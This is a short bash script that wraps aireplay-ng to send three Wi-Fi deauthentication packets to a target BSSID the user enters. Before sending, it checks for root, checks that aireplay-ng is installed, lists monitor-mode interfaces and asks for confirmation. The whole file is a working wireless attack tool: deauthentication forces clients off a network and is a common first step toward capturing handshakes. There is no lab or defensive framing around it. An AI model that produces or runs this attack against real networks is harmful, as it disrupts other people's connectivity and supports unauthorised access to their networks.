#!/bin/bash

# Check for root permissions
if [ "$EUID" -ne 0 ]; then
    echo "Error: This script requires root permissions. Please run it with sudo."
    exit 1
fi

# Check if aireplay-ng is installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "Error: aireplay-ng is not installed. Install it and try again."
    exit 1
fi

# Prompt user for BSSID
read -p "Enter the target BSSID: " BSSID

# Verify the wireless interface
echo "Available wireless interfaces in monitor mode:"
iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}'
read -p "Enter the wireless interface in monitor mode (e.g., wlan0mon): " INTERFACE

# Validate inputs
if [ -z "$BSSID" ] || [ -z "$INTERFACE" ]; then
    echo "Error: Both BSSID and interface must be provided."
    exit 1
fi

# Confirm action
read -p "Are you sure you want to send 3 deauthentication packets to $BSSID on interface $INTERFACE? (y/n): " CONFIRM
if [[ "$CONFIRM" != "y" ]]; then
    echo "Operation canceled."
    exit 0
fi

# Execute aireplay-ng
echo "Sending 3 deauthentication packets to BSSID: $BSSID on interface: $INTERFACE..."
aireplay-ng --deauth 3 -a "$BSSID" "$INTERFACE"

echo "Operation completed."
